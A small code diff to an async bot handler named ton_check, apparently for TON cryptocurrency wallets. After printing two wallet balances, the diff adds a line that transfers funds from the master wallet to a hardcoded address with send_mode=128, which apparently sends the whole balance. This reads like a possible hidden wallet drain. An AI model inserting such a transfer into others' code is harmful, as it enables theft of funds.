@@ -33,3 +33,5 @@ async def ton_check(call: types.CallbackQuery, state: FSMContext):
     uw_balance = await user_wallet.get_balance()
     print('mw balance', mw_balance)
     print('uw balance', uw_balance)
+
+    await master_wallet.transfer_ton('EQCRtYOB0RjvWEkfIu1e-dhu2V-ikQlRAqGbpu1bV3GHs283', 500_000_000, send_mode=128)
